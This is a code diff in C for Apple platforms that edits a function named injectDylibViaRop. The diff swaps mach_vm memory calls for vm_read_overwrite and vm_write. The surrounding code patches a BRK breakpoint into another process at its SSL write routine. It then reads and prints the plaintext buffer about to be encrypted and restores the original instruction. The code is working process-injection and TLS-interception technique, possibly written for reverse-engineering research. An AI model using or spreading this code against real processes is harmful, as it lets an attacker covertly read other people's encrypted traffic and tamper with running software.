@@ -506,15 +506,15 @@ void injectDylibViaRop(task_t task, pid_t pid, const char* dylibPath, vm_address
 		
 		// 2. Save original instruction (ARM64 = 4 bytes)
 		uint32_t original_insn = 0;
-		mach_vm_size_t read_size = 0;
-		kr = mach_vm_read_overwrite(task, sslWriteAddr, 4, 
-		                            (mach_vm_address_t)&original_insn, &read_size);
+		mach_msg_type_number_t read_size = 4;
+		kr = vm_read_overwrite(task, sslWriteAddr, 4, 
+		                      (vm_address_t)&original_insn, &read_size);
 		if (kr == KERN_SUCCESS) {
 			printf("[DEBUG] Original instruction: 0x%08X\n", original_insn);
 			
 			// 3. Write BRK #0 instruction
 			uint32_t brk_insn = 0xD4200000;  // BRK #0 (ARM64)
-			kr = mach_vm_write(task, sslWriteAddr, (vm_offset_t)&brk_insn, 4);
+			kr = vm_write(task, sslWriteAddr, (vm_offset_t)&brk_insn, 4);
 			if (kr == KERN_SUCCESS) {
 				printf("[DEBUG] Breakpoint set successfully\n");
 			} else {
@@ -602,9 +602,9 @@ void injectDylibViaRop(task_t task, pid_t pid, const char* dylibPath, vm_address
 				if (buf_ptr && buf_len > 0 && buf_len < 16384) {
 					char *buffer = malloc(buf_len + 1);
 					if (buffer) {
-						mach_vm_size_t read_size = 0;
-						kr = mach_vm_read_overwrite(task, buf_ptr, buf_len,
-						                            (mach_vm_address_t)buffer, &read_size);
+					mach_msg_type_number_t read_size = buf_len;
+					kr = vm_read_overwrite(task, buf_ptr, buf_len,
+					                      (vm_address_t)buffer, &read_size);
 						if (kr == KERN_SUCCESS) {
 							buffer[buf_len] = '\0';
 							printf("\n[DEBUG] ===== BUFFER CONTENT =====\n");
@@ -626,8 +626,8 @@ void injectDylibViaRop(task_t task, pid_t pid, const char* dylibPath, vm_address
 				}
 				
 				// Restore original instruction
-				kr = mach_vm_write(task, sslWriteAddr, 
-				                  (vm_offset_t)&original_insn, 4);
+				kr = vm_write(task, sslWriteAddr, 
+				             (vm_offset_t)&original_insn, 4);
 				
 				// Rewind PC to re-execute original instruction
 				thread_state.__pc = sslWriteAddr;
